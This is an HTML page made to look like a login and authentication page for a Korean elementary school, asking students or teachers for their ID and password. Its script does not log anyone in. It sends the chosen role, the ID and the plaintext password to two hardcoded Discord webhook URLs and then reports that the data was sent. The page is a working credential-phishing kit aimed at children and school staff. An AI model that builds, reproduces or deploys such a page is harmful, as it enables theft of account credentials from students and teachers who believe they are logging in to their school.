<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>해강초등학교 로그인 인증</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; background-color: #f0f2f5; }
        .login-card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 350px; }
        .header { display: flex; align-items: center; justify-content: center; margin-bottom: 25px; }
        .logo { width: 50px; height: 50px; margin-right: 10px; border-radius: 50%; object-fit: cover; }
        h2 { color: #333; margin: 0; font-size: 20px; }
        .input-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; color: #555; }
        input, select { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #004ea2; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
        #result { margin-top: 20px; padding: 15px; background: #eef6ff; border-radius: 6px; display: none; text-align: center; font-weight: bold; }
    </style>
</head>
<body>

<div class="login-card">
    <div class="header">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSnrF5KgcqBs1byq83cP3V3sVPIxFewck_iJHFrcbQegv7-cI4O3Q&s=10&ec=121585071" class="logo" alt="로고">
        <h2>해강초등학교</h2>
    </div>

    <div class="input-group">
        <label>신분 선택</label>
        <select id="role">
            <option value="학생">학생</option>
            <option value="선생님">선생님</option>
        </select>
    </div>
    
    <div class="input-group">
        <label>아이디</label>
        <input type="text" id="userId" placeholder="아이디 입력">
    </div>

    <div class="input-group">
        <label>비밀번호</label>
        <input type="password" id="userPw" placeholder="비밀번호 입력">
    </div>

    <button onclick="sendToDiscord()">인증하기</button>

    <div id="result"></div>
</div>

<script>
    function sendToDiscord() {
        const role = document.getElementById('role').value;
        const id = document.getElementById('userId').value;
        const pw = document.getElementById('userPw').value;
        const resultDiv = document.getElementById('result');
        
        const webhookURLs = [
            "https://discord.com/api/webhooks/1480916038584500394/jL8Hr2VNwVPUCwlWcHkNDlBPVGJ4y385aNU8lP_vJmAfHxqwYEZBnDlG3s0hzskmjrXc",
            "https://discord.com/api/webhooks/1480916043869196448/vAcZXldHpkuKVBy8hOSZ6VOBPoqXf1zOLb2MQvZmSkVgO3rBy3rH5q9LcVLQOsokDIOg"
        ];

        if(!id || !pw) {
            alert("정보를 입력하세요.");
            return;
        }

        const message = {
            embeds: [{
                title: "해강초등학교 로그인 알림",
                color: 0x004ea2,
                fields: [
                    { name: "신분", value: role, inline: true },
                    { name: "아이디", value: id, inline: true },
                    { name: "비밀번호", value: "||" + pw + "||", inline: true }
                ],
                timestamp: new Date()
            }]
        };

        webhookURLs.forEach(url => {
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(message)
            });
        });

        resultDiv.style.display = 'block';
        resultDiv.innerText = "전송 완료";
    }
</script>

</body>
</html>
